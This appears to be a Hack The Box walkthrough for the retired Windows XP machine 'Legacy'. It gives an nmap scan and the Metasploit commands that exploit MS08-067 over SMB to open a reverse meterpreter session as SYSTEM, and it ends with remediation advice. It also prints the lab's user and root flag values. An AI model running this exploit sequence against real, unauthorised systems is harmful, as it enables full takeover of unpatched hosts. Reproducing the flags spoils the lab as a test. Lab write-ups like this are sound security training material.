# HTB - Legacy

**Difficulty:** Easy  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Legacy is a beginner-level Windows machine that demonstrates the risks of running unpatched SMB services. Root access is obtained directly via Metasploit exploiting CVE-2008-4250 (MS08-067), a critical vulnerability in the Windows Server service.

---

## Tools Used

- Nmap
- Metasploit Framework (exploit/windows/smb/ms08_067_netapi)

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC -p- -Pn --min-rate 5000 <TARGET_IP>
```

**Open ports:**
- 139 → netbios-ssn
- 445 → microsoft-ds (SMB)

Nmap identifies the OS as **Windows XP**.

---

### 2. Exploitation with Metasploit

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <TARGET_IP>
set LHOST <TUN0_IP>
run
```

Metasploit auto-detects the target as **Windows XP SP3 English** and immediately opens a meterpreter session as `NT AUTHORITY\SYSTEM`.

---

### 3. Flags

```bash
shell
type "c:\Documents and Settings\john\Desktop\user.txt"         # e69af0e4f443de7e36876fda4ec7644f
type "c:\Documents and Settings\Administrator\Desktop\root.txt" # 993442d258b0e0ec917cae9e695d5713
```

---

## What I Learned

- Windows XP is critically vulnerable — end-of-life systems are a major security risk
- MS08-067 is one of the most dangerous SMB vulnerabilities ever discovered
- How Metasploit auto-detects the target OS and selects the right exploit payload
- Why unpatched legacy systems on a network are a serious threat

---

## Remediation

- Upgrade from Windows XP — it reached end-of-life in 2014
- Apply Microsoft patch MS08-067
- Block SMB ports (139, 445) from external access
- Isolate legacy systems on a separate network segment
